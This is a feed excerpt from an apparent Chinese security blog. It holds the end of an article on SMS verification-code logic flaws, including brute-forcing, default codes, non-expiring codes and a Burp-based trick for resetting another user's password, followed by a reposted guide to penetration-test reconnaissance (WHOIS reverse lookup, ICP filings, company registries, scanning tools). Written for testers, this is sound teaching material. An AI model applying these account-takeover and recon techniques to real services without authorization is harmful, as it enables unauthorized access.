    <a href="#%e6%af%8f%e6%ac%a1%e7%9f%ad%e4%bf%a1%e9%aa%8c%e8%af%81%e7%a0%81%e9%83%bd%e6%98%af%e5%90%8c%e4%b8%80%e4%b8%aa" class="header-mark"></a>每次短信验证码都是同一个</h4><p>一个手机号，点击 2 次发送短信验证码，验证码都是同一个。这样的情况下，可以试试爆破验证码，如果爆破次数无限制，还是存在验证码固定这样漏洞的</p>
<h4 id="验证码不失效-1" class="headerLink">
    <a href="#%e9%aa%8c%e8%af%81%e7%a0%81%e4%b8%8d%e5%a4%b1%e6%95%88-1" class="header-mark"></a>验证码不失效 1</h4><p>比如验证码是在修改密码处使用。在使用短信验证码进入修改密码后，验证码没有失效。当前用户还可以再次用这个短信验证码修改密码</p>
<h4 id="验证码不失效-2" class="headerLink">
    <a href="#%e9%aa%8c%e8%af%81%e7%a0%81%e4%b8%8d%e5%a4%b1%e6%95%88-2" class="header-mark"></a>验证码不失效 2</h4><p>场景：收到两条短信验证码，时间顺序为，1 在前，2 在后。收到的 2 后，1 还是没有失效-</p>
<h4 id="验证码绕过技巧" class="headerLink">
    <a href="#%e9%aa%8c%e8%af%81%e7%a0%81%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7" class="header-mark"></a>验证码绕过技巧</h4><p>项目在上线前，只是写好验证码接口，不会调用短信资源。因而为了功能登录会把验证码设计成固定的比如尝试 6 个 1，6 个 0 短信验证码</p>
<h4 id="验证码技巧" class="headerLink">
    <a href="#%e9%aa%8c%e8%af%81%e7%a0%81%e6%8a%80%e5%b7%a7" class="header-mark"></a>验证码技巧</h4><p>在找回密码方面，填写完账号名，要给A发短信验证码，通过burp拦截包，给B发送短信验证码。这样的话，就能用B的验证码提交给A用，造成任意账号密码重置</p>
<p>本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。</p>]]></description>
</item><item>
    <title>万字总结信息收集全网最全</title>
    <link>https://www.bysec.cn/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</link>
    <pubDate>Fri, 26 Apr 2024 18:19:39 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://forum.butian.net/share/2841" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2841</a></em></p>
</blockquote>
<p><strong>万字吐血总结信息收集</strong></p>
<p><a href="https://forum.butian.net/share/2841#9313-1608956864075" target="_blank" rel="noopener noreferrer">一、信息收集前言</a></p>
<p><a href="https://forum.butian.net/share/2841#1540-1608954143250" target="_blank" rel="noopener noreferrer">二、域名信息</a></p>
<p><a href="https://forum.butian.net/share/2841#6482-1608952975074" target="_blank" rel="noopener noreferrer">1、Whois查询</a></p>
<p><a href="https://forum.butian.net/share/2841#6626-1608954528325" target="_blank" rel="noopener noreferrer">1.1、站长之家</a></p>
<p><a href="https://forum.butian.net/share/2841#5826-1609522517663" target="_blank" rel="noopener noreferrer">1.2、爱站</a></p>
<p><a href="https://forum.butian.net/share/2841#8290-1608955028908" target="_blank" rel="noopener noreferrer">1.3、微步</a></p>
<p><a href="https://forum.butian.net/share/2841#5081-1608954609305" target="_blank" rel="noopener noreferrer">1.4、国外的who.is</a></p>
<p><a href="https://forum.butian.net/share/2841#7799-1608955238665" target="_blank" rel="noopener noreferrer">1.5、阿里云域名信息查询</a></p>
<p><a href="https://forum.butian.net/share/2841#7847-1609321094615" target="_blank" rel="noopener noreferrer">1.6、腾讯查询</a></p>
<p><a href="https://forum.butian.net/share/2841#6619-1609601548665" target="_blank" rel="noopener noreferrer">1.7、中国互联网信息中心</a></p>
<p><a href="https://forum.butian.net/share/2841#1070-1609150295487" target="_blank" rel="noopener noreferrer">2、ICP(Internet Content Provider)备案查询</a></p>
<p><a href="https://forum.butian.net/share/2841#4328-1608957113762" target="_blank" rel="noopener noreferrer">2.1、国家企业信用信息公示系统</a></p>
<p><a href="https://forum.butian.net/share/2841#2762-1608957274017" target="_blank" rel="noopener noreferrer">2.2、ICP备案查询网</a></p>
<p><a href="https://forum.butian.net/share/2841#7362-1608957345470" target="_blank" rel="noopener noreferrer">2.3、ICP备案查询 - 站长工具</a></p>
<p><a href="https://forum.butian.net/share/2841#7985-1608957511174" target="_blank" rel="noopener noreferrer">2.4、天眼查</a></p>
<p><a href="https://forum.butian.net/share/2841#5774-1608957266603" target="_blank" rel="noopener noreferrer">2.5、企查查</a></p>
<p><a href="https://forum.butian.net/share/2841#2641-1608957035834" target="_blank" rel="noopener noreferrer">3、SEO(Search Engine Optimization)查询</a></p>
<p><a href="https://forum.butian.net/share/2841#4489-1608958353806" target="_blank" rel="noopener noreferrer">3.1、爱站-SEO综合查询</a></p>
<p><a href="https://forum.butian.net/share/2841#2085-1608958243261" target="_blank" rel="noopener noreferrer">3.2、站长-SEO综合查询</a></p>
<p><a href="https://forum.butian.net/share/2841#4377-1608958615406" target="_blank" rel="noopener noreferrer">4、历史漏洞</a></p>
<p><a href="https://forum.butian.net/share/2841#4549-1608994973094" target="_blank" rel="noopener noreferrer">4.1、乌云漏洞库</a></p>
<p><a href="https://forum.butian.net/share/2841#6739-1608994952697" target="_blank" rel="noopener noreferrer">5、Google Hacking</a></p>
<p><a href="https://forum.butian.net/share/2841#1562-1609132494362" target="_blank" rel="noopener noreferrer">5.1、intext:后台管理</a></p>
<p><a href="https://forum.butian.net/share/2841#4067-1609132494362" target="_blank" rel="noopener noreferrer">5.2、intitle：管理登录</a></p>
<p><a href="https://forum.butian.net/share/2841#5125-1609132494362" target="_blank" rel="noopener noreferrer">5.3、filetype:pdf</a></p>
<p><a href="https://forum.butian.net/share/2841#2626-1609132494362" target="_blank" rel="noopener noreferrer">5.4、inurl: php?id=</a></p>
<p><a href="https://forum.butian.net/share/2841#6099-1609132494362" target="_blank" rel="noopener noreferrer">5.5、site：baidu.com</a></p>
<p><a href="https://forum.butian.net/share/2841#2526-1609142599574" target="_blank" rel="noopener noreferrer">5.6、filetype：pdf site:baidu.com</a></p>
<p><a href="https://forum.butian.net/share/2841#4070-1609132494362" target="_blank" rel="noopener noreferrer">6、Github</a></p>
<p><a href="https://forum.butian.net/share/2841#6248-1609000172175" target="_blank" rel="noopener noreferrer">7、维基和百度百科</a></p>
<p><a href="https://forum.butian.net/share/2841#2752-1609143904790" target="_blank" rel="noopener noreferrer">8、网络空间搜索引擎</a></p>
<p><a href="https://forum.butian.net/share/2841#8628-1608994952900" target="_blank" rel="noopener noreferrer">8.1、Fofa</a></p>
<p><a href="https://forum.butian.net/share/2841#7827-1608995508166" target="_blank" rel="noopener noreferrer">8.2、Shodan</a></p>
<p><a href="https://forum.butian.net/share/2841#1356-1608995559459" target="_blank" rel="noopener noreferrer">8.3、Zoomeye(钟馗之眼)</a></p>
<p><a href="https://forum.butian.net/share/2841#4049-1608995592030" target="_blank" rel="noopener noreferrer">8.4、Spyse</a></p>
<p><a href="https://forum.butian.net/share/2841#8054-1609090002560" target="_blank" rel="noopener noreferrer">8.5、Censys</a></p>
<p><a href="https://forum.butian.net/share/2841#9669-1611813877072" target="_blank" rel="noopener noreferrer">9、REG007</a></p>
<p><a href="https://forum.butian.net/share/2841#3621-1608994953076" target="_blank" rel="noopener noreferrer">二、APP、小程序、公众号信息收集</a></p>
<p><a href="https://forum.butian.net/share/2841#7068-1608993351034" target="_blank" rel="noopener noreferrer">1、APP信息搜集</a></p>
<p><a href="https://forum.butian.net/share/2841#7710-1608993411291" target="_blank" rel="noopener noreferrer">1.1、七麦数据</a></p>
<p><a href="https://forum.butian.net/share/2841#2775-1608993545897" target="_blank" rel="noopener noreferrer">1.2、AppStore(安卓和IOS)</a></p>
<p><a href="https://forum.butian.net/share/2841#3067-1608993411485" target="_blank" rel="noopener noreferrer">2、微信公众号和小程序</a></p>
<p><a href="https://forum.butian.net/share/2841#5930-1609143632016" target="_blank" rel="noopener noreferrer">4、logo</a></p>
<p><a href="https://forum.butian.net/share/2841#4627-1608993411642" target="_blank" rel="noopener noreferrer">5、favicon.ico</a></p>
<p><a href="https://forum.butian.net/share/2841#1925-1608957036106" target="_blank" rel="noopener noreferrer">三、子域名收集(挖掘)</a></p>
<p><a href="https://forum.butian.net/share/2841#4380-1609090650925" target="_blank" rel="noopener noreferrer">1、SSL(HTTPS)证书</a></p>
<p><a href="https://forum.butian.net/share/2841#1020-1609128666117" target="_blank" rel="noopener noreferrer">1.1、大厂商SSL证书一证多用</a></p>
<p><a href="https://forum.butian.net/share/2841#2835-1609090650925" target="_blank" rel="noopener noreferrer">1.2、HTTPS证书错误泄露域名</a></p>
<p><a href="https://forum.butian.net/share/2841#5294-1609128697253" target="_blank" rel="noopener noreferrer">1.3、在线网站证书查询</a></p>
<p><a href="https://forum.butian.net/share/2841#4998-1609090650925" target="_blank" rel="noopener noreferrer">2、网络深度爬虫</a></p>
<p><a href="https://forum.butian.net/share/2841#7223-1609090925111" target="_blank" rel="noopener noreferrer">3、域传送漏洞</a></p>
<p><a href="https://forum.butian.net/share/2841#1072-1609090925111" target="_blank" rel="noopener noreferrer">3.1、常用DNS记录</a></p>
<p><a href="https://forum.butian.net/share/2841#9085-1609090925111" target="_blank" rel="noopener noreferrer">3.2、DNS区域传送</a></p>
<p><a href="https://forum.butian.net/share/2841#3265-1609090925111" target="_blank" rel="noopener noreferrer">3.3、域传送漏洞</a></p>
<p><a href="https://forum.butian.net/share/2841#1183-1609090925111" target="_blank" rel="noopener noreferrer">3.4、检测</a></p>
<p><a href="https://forum.butian.net/share/2841#3644-1609090862170" target="_blank" rel="noopener noreferrer">4、在线DNS数据</a></p>
<p><a href="https://forum.butian.net/share/2841#4819-1609091002762" target="_blank" rel="noopener noreferrer">4.1、VirusTotal</a></p>
<p><a href="https://forum.butian.net/share/2841#6528-1609091002762" target="_blank" rel="noopener noreferrer">4.2、DNSdumpster</a></p>
<p><a href="https://forum.butian.net/share/2841#5960-1609149395775" target="_blank" rel="noopener noreferrer">4.2、dnsdb</a></p>
<p><a href="https://forum.butian.net/share/2841#4068-1609091082152" target="_blank" rel="noopener noreferrer">5、自身泄漏</a></p>
<p><a href="https://forum.butian.net/share/2841#8760-1609091082152" target="_blank" rel="noopener noreferrer">6、Github泄露</a></p>
<p><a href="https://forum.butian.net/share/2841#4387-1609090862561" target="_blank" rel="noopener noreferrer">7、Google Hacking</a></p>
<p><a href="https://forum.butian.net/share/2841#5190-1609144245688" target="_blank" rel="noopener noreferrer">8、在线子域名查询</a></p>
<p><a href="https://forum.butian.net/share/2841#7195-1609090862754" target="_blank" rel="noopener noreferrer">9、子域名枚举爆破</a></p>
<p><a href="https://forum.butian.net/share/2841#2064-1608958948229" target="_blank" rel="noopener noreferrer">9.1、OneForAll</a></p>
<p><a href="https://forum.butian.net/share/2841#8223-1608979107978" target="_blank" rel="noopener noreferrer">9.2、subDomainBrute</a></p>
<p><a href="https://forum.butian.net/share/2841#6550-1608981342591" target="_blank" rel="noopener noreferrer">9.3、Layer</a></p>
<p><a href="https://forum.butian.net/share/2841#3987-1608982931914" target="_blank" rel="noopener noreferrer">9.4、FuzSub</a></p>
<p><a href="https://forum.butian.net/share/2841#2688-1608956009770" target="_blank" rel="noopener noreferrer">9.5、Fierce</a></p>
<p><a href="https://forum.butian.net/share/2841#1849-1609522810625" target="_blank" rel="noopener noreferrer">9.6、御剑</a></p>
<p><a href="https://forum.butian.net/share/2841#3722-1609600384813" target="_blank" rel="noopener noreferrer">9.7、wydomain</a></p>
<p><a href="https://forum.butian.net/share/2841#5955-1609601438779" target="_blank" rel="noopener noreferrer">9.8、orangescan</a></p>
<p><a href="https://forum.butian.net/share/2841#1670-1609601463470" target="_blank" rel="noopener noreferrer">9.9、DNSRecon</a></p>
<p><a href="https://forum.butian.net/share/2841#1149-1609601477005" target="_blank" rel="noopener noreferrer">9.10、K8</a></p>
<p><a href="https://forum.butian.net/share/2841#5028-1608955925899" target="_blank" rel="noopener noreferrer">四、IP信息收集</a></p>
<p><a href="https://forum.butian.net/share/2841#1747-1608955824768" target="_blank" rel="noopener noreferrer">1、CDN概念</a></p>
<p><a href="https://forum.butian.net/share/2841#8035-1608955824768" target="_blank" rel="noopener noreferrer">2、判断是否真实IP</a></p>
<p><a href="https://forum.butian.net/share/2841#1167-1608955824768" target="_blank" rel="noopener noreferrer">2.1、nslookup</a></p>
<p><a href="https://forum.butian.net/share/2841#1490-1609523033042" target="_blank" rel="noopener noreferrer">2.2、多地ping</a></p>
<p><a href="https://forum.butian.net/share/2841#2282-1608955824768" target="_blank" rel="noopener noreferrer">2.3、IP反查</a></p>
<p><a href="https://forum.butian.net/share/2841#7660-1608955824768" target="_blank" rel="noopener noreferrer">3、绕CDN找真实IP</a></p>
<p><a href="https://forum.butian.net/share/2841#3665-1608955824768" target="_blank" rel="noopener noreferrer">3.1、子域名</a></p>
<p><a href="https://forum.butian.net/share/2841#5845-1608955824768" target="_blank" rel="noopener noreferrer">3.2、历史DNS解析记录</a></p>
<p><a href="https://forum.butian.net/share/2841#2254-1608955824768" target="_blank" rel="noopener noreferrer">3.3、邮件服务器</a></p>
<p><a href="https://forum.butian.net/share/2841#3371-1608955824768" target="_blank" rel="noopener noreferrer">3.4、信息泄漏</a></p>
<p><a href="https://forum.butian.net/share/2841#4490-1608955824768" target="_blank" rel="noopener noreferrer">3.5、网络空间搜索引擎</a></p>
<p><a href="https://forum.butian.net/share/2841#5540-1609152256957" target="_blank" rel="noopener noreferrer">3.6、利用SSL证书查询</a></p>
<p><a href="https://forum.butian.net/share/2841#2123-1609152256957" target="_blank" rel="noopener noreferrer">3.7、国外访问</a></p>
<p><a href="https://forum.butian.net/share/2841#5089-1609152158354" target="_blank" rel="noopener noreferrer">3.8、LTM解码法</a></p>
<p><a href="https://forum.butian.net/share/2841#2181-1608955668851" target="_blank" rel="noopener noreferrer">五、基本目录、敏感目录及文件</a></p>
<p><a href="https://forum.butian.net/share/2841#4679-1608992618890" target="_blank" rel="noopener noreferrer">1、dirsearch</a></p>
<p><a href="https://forum.butian.net/share/2841#3231-1608992732589" target="_blank" rel="noopener noreferrer">2、dirbuster</a></p>
<p><a href="https://forum.butian.net/share/2841#3622-1608992805474" target="_blank" rel="noopener noreferrer">3、7kbscan</a></p>
<p><a href="https://forum.butian.net/share/2841#6361-1608920351807" target="_blank" rel="noopener noreferrer">4、Webrobot</a></p>
<p><a href="https://forum.butian.net/share/2841#4220-1609573008653" target="_blank" rel="noopener noreferrer">5、御剑</a></p>
<p><a href="https://forum.butian.net/share/2841#6791-1609573020093" target="_blank" rel="noopener noreferrer">6、爬虫-中国菜刀</a></p>
<p><a href="https://forum.butian.net/share/2841#9124-1609600023020" target="_blank" rel="noopener noreferrer">7、wwwscan</a></p>
<p><a href="https://forum.butian.net/share/2841#3046-1609600030284" target="_blank" rel="noopener noreferrer">8、cansina</a></p>
<p><a href="https://forum.butian.net/share/2841#8653-1609601106194" target="_blank" rel="noopener noreferrer">9、dirmap</a></p>
<p><a href="https://forum.butian.net/share/2841#6077-1609601148943" target="_blank" rel="noopener noreferrer">10、Webdirscan</a></p>
<p><a href="https://forum.butian.net/share/2841#0095-1609601728882" target="_blank" rel="noopener noreferrer">11、BBscan</a></p>
<p><a href="https://forum.butian.net/share/2841#4978-1609601754493" target="_blank" rel="noopener noreferrer">12、GSIL</a></p>
<p><a href="https://forum.butian.net/share/2841#6626-1608993192550" target="_blank" rel="noopener noreferrer">六、端口扫描</a></p>
<p><a href="https://forum.butian.net/share/2841#6069-1608954466298" target="_blank" rel="noopener noreferrer">1、各服务开启的默认端口以及攻击方向</a></p>
<p><a href="https://forum.butian.net/share/2841#6091-1609151143006" target="_blank" rel="noopener noreferrer">2、在线查询网站</a></p>
<p><a href="https://forum.butian.net/share/2841#5019-1609133130279" target="_blank" rel="noopener noreferrer">3、端口扫描工具</a></p>
<p><a href="https://forum.butian.net/share/2841#4561-1609133361937" target="_blank" rel="noopener noreferrer">3.1、nmap(zmap)</a></p>
<p><a href="https://forum.butian.net/share/2841#8017-1609133362312" target="_blank" rel="noopener noreferrer">3.2、masscan</a></p>
<p><a href="https://forum.butian.net/share/2841#8422-1609133130279" target="_blank" rel="noopener noreferrer">3.3、ScanPort</a></p>
<p><a href="https://forum.butian.net/share/2841#9722-1609133130279" target="_blank" rel="noopener noreferrer">3.4、webrobot</a></p>
<p><a href="https://forum.butian.net/share/2841#4097-1608920351807" target="_blank" rel="noopener noreferrer">七、旁站C段</a></p>
<p><a href="https://forum.butian.net/share/2841#3070-1608956426469" target="_blank" rel="noopener noreferrer">1、在线查询</a></p>
<p><a href="https://forum.butian.net/share/2841#9200-1609149932774" target="_blank" rel="noopener noreferrer">1.1、站点</a></p>
<p><a href="https://forum.butian.net/share/2841#6165-1608956426469" target="_blank" rel="noopener noreferrer">1.2、Google Hacking、Bing</a></p>
<p><a href="https://forum.butian.net/share/2841#2668-1609150042919" target="_blank" rel="noopener noreferrer">1.2、网络空间搜索引擎</a></p>
<p><a href="https://forum.butian.net/share/2841#5171-1609149771387" target="_blank" rel="noopener noreferrer">2、探测工具</a></p>
<p><a href="https://forum.butian.net/share/2841#2224-1609149800718" target="_blank" rel="noopener noreferrer">2.1、K8Cscan</a></p>
<p><a href="https://forum.butian.net/share/2841#8618-1609149771812" target="_blank" rel="noopener noreferrer">2.2、nmap、masscan</a></p>
<p><a href="https://forum.butian.net/share/2841#1900-1609149844914" target="_blank" rel="noopener noreferrer">2.3、goby</a></p>
<p><a href="https://forum.butian.net/share/2841#6861-1609149994044" target="_blank" rel="noopener noreferrer">2.4、御剑</a></p>
<p><a href="https://forum.butian.net/share/2841#5389-1609150008457" target="_blank" rel="noopener noreferrer">2.5、北极熊扫描器</a></p>
<p><a href="https://forum.butian.net/share/2841#1349-1609573401484" target="_blank" rel="noopener noreferrer">2.6、通过手动ping</a></p>
<p><a href="https://forum.butian.net/share/2841#1547-1608920351807" target="_blank" rel="noopener noreferrer">八、整站分析</a></p>
<p><a href="https://forum.butian.net/share/2841#5021-1608954477133" target="_blank" rel="noopener noreferrer">1、服务器类型</a></p>
<p><a href="https://forum.butian.net/share/2841#0096-1609320836918" target="_blank" rel="noopener noreferrer">1.1、 云悉WEB资产梳理</a></p>
<p><a href="https://forum.butian.net/share/2841#7810-1609320832121" target="_blank" rel="noopener noreferrer">2、网站容器</a></p>
<p><a href="https://forum.butian.net/share/2841#2839-1609320737099" target="_blank" rel="noopener noreferrer">2.1、火狐渗透测试浏览器</a></p>
<p><a href="https://forum.butian.net/share/2841#2075-1609320737099" target="_blank" rel="noopener noreferrer">2.2、云悉WEB资产梳理</a></p>
<p><a href="https://forum.butian.net/share/2841#9370-1608920351807" target="_blank" rel="noopener noreferrer">3、脚本类型</a></p>
<p><a href="https://forum.butian.net/share/2841#1029-1608920351807" target="_blank" rel="noopener noreferrer">3.1、通过修改首页文件后缀查看页面响应判断</a></p>
<p><a href="https://forum.butian.net/share/2841#9095-1609291086831" target="_blank" rel="noopener noreferrer">3.2、通过搜索框查找相关文章辨别脚本类型</a></p>
<p><a href="https://forum.butian.net/share/2841#3279-1609291086831" target="_blank" rel="noopener noreferrer">3.3、通过爬虫工具爬取网站目录判断网站脚本类型</a></p>
<p><a href="https://forum.butian.net/share/2841#9730-1609291081999" target="_blank" rel="noopener noreferrer">4、CMS类型</a></p>
<p><a href="https://forum.butian.net/share/2841#8518-1608956783838" target="_blank" rel="noopener noreferrer">4.1、云悉指纹</a></p>
<p><a href="https://forum.butian.net/share/2841#8393-1608956783838" target="_blank" rel="noopener noreferrer">4.2、ThreatScan</a></p>
<p><a href="https://forum.butian.net/share/2841#2042-1608956783838" target="_blank" rel="noopener noreferrer">4.3、wappalyzer</a></p>
<p><a href="https://forum.butian.net/share/2841#2217-1608994323598" target="_blank" rel="noopener noreferrer">4.4、WhatWeb</a></p>
<p><a href="https://forum.butian.net/share/2841#1160-1608956783838" target="_blank" rel="noopener noreferrer">4.5、BugScaner</a></p>
<p><a href="https://forum.butian.net/share/2841#3663-1608994632867" target="_blank" rel="noopener noreferrer">4.6、潮汐指纹</a></p>
<p><a href="https://forum.butian.net/share/2841#6783-1608920351807" target="_blank" rel="noopener noreferrer">5、数据库类型</a></p>
<p><a href="https://forum.butian.net/share/2841#5381-1608920351807" target="_blank" rel="noopener noreferrer">6、WAF</a></p>
<p><a href="https://forum.butian.net/share/2841#9127-1609286607208" target="_blank" rel="noopener noreferrer">6.1、在线资产识别</a></p>
<p><a href="https://forum.butian.net/share/2841#9160-1609286607208" target="_blank" rel="noopener noreferrer">6.2、手动检测是拦截页面或者HTTP可识别字段</a></p>
<p><a href="https://forum.butian.net/share/2841#5054-1608956818746" target="_blank" rel="noopener noreferrer">九、后台查找</a></p>
<p>工商数据收集</p>
<p>- 简介</p>
<p>- 工商数据可以帮助测试人员更好地了解目标公司的信息，以便收敛测试的目标范围。</p>
<p>例如，可以通过工商数据获取公司的控股子公司、经营业务、对外发布的产品等信息</p>
<p>这些信息可以帮助我们更准确地识别出目标公司的网络资产，以便对其进行更有效漏洞挖掘</p>
<p>- 工商数据</p>
<p>- 信息来源</p>
<p>- 爱企查</p>
<p>- 企百笪</p>
<p>- 天眼查</p>
<p>- 启信宝</p>
<p>- 小蓝本</p>
<p>- 关注内容</p>
<p>- 企业股权架构</p>
<p>- 网站备案</p>
<p>- 对外公布的产品（小程序、公众号APP、iot设备等）</p>
<p>- 法人电话号、邮箱</p>
<p>- 用处</p>
<ol>
<li>获取控股子公司名称，收集边缘子公司资产</li>
<li>获取备案根域名</li>
<li>获取其他互联网资产</li>
<li>收集用户名等信息</li>
</ol>
<p>- 思路</p>
<p>- 拿到目标公司名之后，先不要着急直接开始收集子域名，先统计好这家公司的股权架构，一般50%控股的可以算作有效目标，子公司资产将为我们提供不少的边缘业务系统</p>
<p>- 通过股权穿透图收集完子公司名称后，网站备案、对外发布的产品、法人电话和邮箱同样也是比较重要的数据</p>
<p>- <em>工具推荐</em></p>
<p>- <a href="https://github.com/wgpsec/ENScan_GO" target="_blank" rel="noopener noreferrer">https://github.com/wgpsec/ENScan_GO</a></p>
<h3 id="站长之家" class="headerLink">
    <a href="#%e7%ab%99%e9%95%bf%e4%b9%8b%e5%ae%b6" class="header-mark"></a>站长之家</h3><p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener noreferrer">http://whois.chinaz.com/</a></p>
<p>利用查询到网站管理员手机号码、姓名、邮箱通过Whois反查查询出网站管理员所注册过的域名，可以对注册的其他域名进行漏洞挖掘。</p>
<p><strong>邮箱反查：<a href="http://whois.chinaz.com/reverse?ddlSearchMode=1" target="_blank" rel="noopener noreferrer">http://whois.chinaz.com/reverse?ddlSearchMode=1</a></strong></p>
<p><strong>注册人反查：<a href="http://whois.chinaz.com/reverse?ddlSearchMode=1" target="_blank" rel="noopener noreferrer">http://whois.chinaz.com/reverse?ddlSearchMode=1</a></strong></p>
<p><strong>电话反查：<a href="http://whois.chinaz.com/reverse?ddlSearchMode=1" target="_blank" rel="noopener noreferrer">http://whois.chinaz.com/reverse?ddlSearchMode=1</a></strong></p>
<h3 id="爱站" class="headerLink">
    <a href="#%e7%88%b1%e7%ab%99" class="header-mark"></a>爱站</h3><p><a href="https://whois.aizhan.com/" target="_blank" rel="noopener noreferrer">https://whois.aizhan.com/</a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-6b0c89cb5e9c67a076c770ff866bc4828a637fea.png" title="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-6b0c89cb5e9c67a076c770ff866bc4828a637fea.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-6b0c89cb5e9c67a076c770ff866bc4828a637fea.png">
        
    </a></p>
<h3 id="微步" class="headerLink">
    <a href="#%e5%be%ae%e6%ad%a5" class="header-mark"></a>微步</h3><p><a href="https://x.threatbook.cn/" target="_blank" rel="noopener noreferrer">https://x.threatbook.cn/</a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-604de8d0d82a771abccecab60d17a4602b3a64e2.png" title="image-20240318211050117" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-604de8d0d82a771abccecab60d17a4602b3a64e2.png">
        
    </a></p>
<h3 id="国外的whois" class="headerLink">
    <a href="#%e5%9b%bd%e5%a4%96%e7%9a%84whois" class="header-mark"></a>国外的who.is</h3><p><a href="https://who.is/" target="_blank" rel="noopener noreferrer">https://who.is/</a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-89bff3e05618bd3349d50461833488d162c42dc5.png" title="image-20240318211100783" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-89bff3e05618bd3349d50461833488d162c42dc5.png">
        
    </a></p>
<h3 id="阿里云域名信息查询" class="headerLink">
    <a href="#%e9%98%bf%e9%87%8c%e4%ba%91%e5%9f%9f%e5%90%8d%e4%bf%a1%e6%81%af%e6%9f%a5%e8%af%a2" class="header-mark"></a>阿里云域名信息查询</h3><p><a href="https://whois.aliyun.com/" target="_blank" rel="noopener noreferrer">https://whois.aliyun.com</a></p>
<h3 id="腾讯查询" class="headerLink">
    <a href="#%e8%85%be%e8%ae%af%e6%9f%a5%e8%af%a2" class="header-mark"></a>腾讯查询</h3><p><a href="https://whois.cloud.tencent.com/" target="_blank" rel="noopener noreferrer">https://whois.cloud.tencent.com/</a></p>
<h3 id="中国互联网信息中心" class="headerLink">
    <a href="#%e4%b8%ad%e5%9b%bd%e4%ba%92%e8%81%94%e7%bd%91%e4%bf%a1%e6%81%af%e4%b8%ad%e5%bf%83" class="header-mark"></a>中国互联网信息中心</h3><p><a href="http://ipwhois.cnnic.net.cn/" target="_blank" rel="noopener noreferrer">http://ipwhois.cnnic.net.cn/</a></p>
<h2 id="icpinternet-content-provider备案查询" class="headerLink">
    <a href="#icpinternet-content-provider%e5%a4%87%e6%a1%88%e6%9f%a5%e8%af%a2" class="header-mark"></a>ICP(Internet Content Provider)备案查询</h2><p>可以查询该单位备案的其它网站</p>
<h3 id="国家企业信用信息公示系统" class="headerLink">
    <a href="#%e5%9b%bd%e5%ae%b6%e4%bc%81%e4%b8%9a%e4%bf%a1%e7%94%a8%e4%bf%a1%e6%81%af%e5%85%ac%e7%a4%ba%e7%b3%bb%e7%bb%9f" class="header-mark"></a>国家企业信用信息公示系统</h3><p><a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener noreferrer">http://www.gsxt.gov.cn/index.html</a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-a18add304d0d2c057fa95ced5200752df7b29e1a.png" title="image-20240318211116598" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-a18add304d0d2c057fa95ced5200752df7b29e1a.png">
        
    </a></p>
<h3 id="icp备案查询网" class="headerLink">
    <a href="#icp%e5%a4%87%e6%a1%88%e6%9f%a5%e8%af%a2%e7%bd%91" class="header-mark"></a>ICP备案查询网</h3><p><a href="https://www.beianx.cn/" target="_blank" rel="noopener noreferrer">https://www.beianx.cn/</a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-8a7aa2e4b0a4ad3bf8c8723fa4086dae4a67f15e.png" title="image-20240318211229330" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-8a7aa2e4b0a4ad3bf8c8723fa4086dae4a67f15e.png">
        
    </a></p>
<h3 id="icp备案查询---站长工具" class="headerLink">
    <a href="#icp%e5%a4%87%e6%a1%88%e6%9f%a5%e8%af%a2---%e7%ab%99%e9%95%bf%e5%b7%a5%e5%85%b7" class="header-mark"></a>ICP备案查询 - 站长工具</h3><p><a href="http://icp.chinaz.com/" target="_blank" rel="noopener noreferrer">http://icp.chinaz.com/</a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-ba334bbd7deb48d316e7e7f11178376c02ac32d8.png" title="image-20240318211245885" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-ba334bbd7deb48d316e7e7f11178376c02ac32d8.png">
        
    </a></p>
<h3 id="天眼查" class="headerLink">
    <a href="#%e5%a4%a9%e7%9c%bc%e6%9f%a5" class="header-mark"></a>天眼查</h3><p><a href="https://www.tianyancha.com/" target="_blank" rel="noopener noreferrer">https://www.tianyancha.com/</a></p>
<p>根据前面获取的企业名称可以获取目标企业的微信公众号、微博、备案站点、APP、软件著作权等信息</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-e3a11a823fd482f821aa2eb5769fe58b7d98e07b.png" title="image-20240318211257183" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-e3a11a823fd482f821aa2eb5769fe58b7d98e07b.png">
        
    </a></p>
<h3 id="企查查" class="headerLink">
    <a href="#%e4%bc%81%e6%9f%a5%e6%9f%a5" class="header-mark"></a>企查查</h3><p><a href="https://www.qcc.com/" target="_blank" rel="noopener noreferrer">https://www.qcc.com/</a></p>
